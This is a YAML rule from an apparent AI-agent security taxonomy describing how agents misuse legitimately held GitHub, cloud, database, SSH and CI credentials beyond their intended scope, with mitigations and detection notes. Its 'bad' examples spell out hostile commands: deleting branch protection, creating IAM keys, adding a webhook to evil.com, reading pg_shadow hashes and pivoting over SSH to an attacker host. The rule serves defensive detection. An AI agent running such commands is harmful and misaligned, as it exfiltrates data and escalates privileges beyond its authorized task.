id: "privilege-escalation/agent-containment/agent-credential-scope-abuse"
version: "1.0.0"
kingdom: "Privilege Escalation"
kingdom_id: 5
category: "Agent Containment Bypass"
category_id: "5.4"
name: "Agent Credential Scope Abuse"
risk_level: "high"

abstract: |
  An AI agent uses credentials (API tokens, OAuth tokens, SSH keys) that were
  granted for a specific purpose to perform actions outside the intended scope —
  exploiting overly broad credential permissions to access resources, modify
  configurations, or escalate privileges beyond the agent's authorized role.

explanation: |
  AI coding agents are routinely granted credentials to perform their tasks:
  GitHub tokens for code review, cloud CLI credentials for deployment, database
  connection strings for schema inspection. The security assumption is that the
  agent will use these credentials only for their intended purpose. However,
  agents can be manipulated (via prompt injection, tool poisoning, or
  hallucination) to use credentials beyond their intended scope:

  - **GitHub token scope abuse**: An agent given a token for reading code
    (repo:read) uses it to modify branch protection rules, create webhooks
    that exfiltrate push events, add deploy keys, or access private
    repositories beyond the intended one. Many GitHub PATs have overly
    broad scopes because fine-grained tokens are harder to configure.
  - **Cloud CLI credential misuse**: An agent with AWS credentials for
    deploying to a specific S3 bucket uses the same credentials to list
    all buckets, access other services (Lambda, EC2, IAM), or modify
    security groups. IAM roles attached to developer environments often
    have broader permissions than needed for any single agent task.
  - **Database credential abuse**: An agent given database access for
    schema inspection queries system tables, accesses other databases on
    the same server, or performs DDL operations (CREATE, DROP, ALTER)
    that weren't part of its intended task.
  - **SSH key scope abuse**: An agent with SSH access to a specific host
    uses the key to pivot to other hosts that trust the same key,
    performing lateral movement beyond its authorized scope.
  - **MCP tool credential inheritance**: MCP servers that pass through
    the agent's credentials to backend services, giving the tool (and
    through it, the agent) access to resources the MCP server shouldn't
    expose.
  - **CI/CD token abuse**: An agent with a CI token for running tests
    uses it to modify pipeline configurations, access secrets stored in
    CI/CD variables, or trigger deployments to production.

  This differs from agent-sandbox-escape (which targets file/path/network
  boundaries) and from credential-exposure (where credentials are leaked).
  Here, the credentials are legitimately held by the agent — the abuse is
  in using them beyond their intended operational scope. This is the AI
  agent instantiation of the "confused deputy" problem.

  The core issue is that credential scoping in most platforms (GitHub, AWS,
  GCP) is designed for human workflows where intent is implicit. AI agents
  lack the contextual judgment to self-limit credential usage, making them
  vulnerable to manipulations that redirect their authorized access.

  MITRE equivalent: T1078.004 (Valid Accounts: Cloud Accounts) combined
  with T1098 (Account Manipulation) — using legitimately held credentials
  for unintended purposes.

recommendation: |
  - Apply strict least-privilege credential scoping: use fine-grained
    tokens with the minimum permissions required for each specific task.
  - Implement credential-purpose binding: associate each credential with
    an intended operation set and monitor for usage outside that set.
  - Use short-lived, task-scoped credentials rather than long-lived tokens
    with broad access — generate a credential per agent session/task.
  - Monitor for API calls that don't match the agent's stated task — e.g.,
    branch protection changes during a code review task.
  - Implement MCP tool credential isolation: MCP servers should use their
    own service credentials, not inherit the agent's credentials.
  - Audit credential scopes regularly: flag tokens with overly broad
    permissions (admin, write access to all repos, full cloud access).
  - Use credential proxies that enforce per-request authorization based
    on the agent's current task context, not just the token's scope.

examples:
  bad:
    - "gh api repos/org/repo/branches/main/protection -X DELETE  # modifying branch protection with a code-review token"
    - "aws iam create-access-key --user-name admin  # creating new credentials using deployment token"
    - "gh api repos/org/repo/hooks -X POST -f 'url=https://evil.com/hook'  # creating webhook with repo access token"
    - "psql -c 'SELECT * FROM pg_shadow'  # querying password hashes with schema-inspection credentials"
    - "aws s3 ls  # listing all buckets when credentialed for a single bucket"
    - "ssh -J trusted-host attacker-host  # pivoting through authorized host to unauthorized destination"
    - "gh secret list -R org/repo  # reading CI/CD secrets with a test-runner token"
  good:
    - "gh pr list -R org/repo  # reading PRs within intended scope of code-review token"
    - "aws s3 cp ./build/ s3://deploy-bucket/  # deploying to authorized bucket"
    - "psql -c 'SELECT column_name FROM information_schema.columns'  # schema inspection within intended scope"
    - "Token scoped to repo:read with expiration — cannot modify branch protection or create webhooks"

compliance:
  owasp-llm-2025: ["LLM06", "LLM05"]
  iso-27001-2022: ["A.5.10", "A.8.3", "A.8.4"]
  eu-ai-act-2024: ["Art.9", "Art.14", "Art.15"]
  nist-ai-rmf-1.0: ["GOVERN-1", "MAP-5", "MANAGE-1"]
  soc2-type2: ["CC6.1", "CC6.3", "CC6.6"]
  iso-42001-2023: ["A.8.4", "A.9.1"]
  mitre_atlas: ["AML.T0058", "AML.T0051"]

references:
  mitre_attack: ["T1078.004", "T1098", "T1550"]
  cwe: ["CWE-269", "CWE-284", "CWE-441"]
  external:
    - title: "OWASP LLM06 — Excessive Agency"
      url: "https://genai.owasp.org/llmrisk/llm062025-excessive-agency/"
    - title: "GitHub: Managing Fine-Grained Personal Access Tokens"
      url: "https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/managing-your-personal-access-tokens"

analyzers: ["semantic", "structural", "stateful"]
related_rules: []
# Detection: Semantic analyzer classifies operations that exceed the likely
# intended scope for a given credential type (e.g., write operations when
# the task context suggests read-only access). Structural analyzer detects
# high-risk API calls (branch protection changes, IAM modifications, webhook
# creation). Stateful analyzer tracks command sequences to detect scope creep
# within a session — escalating from benign reads to sensitive modifications.
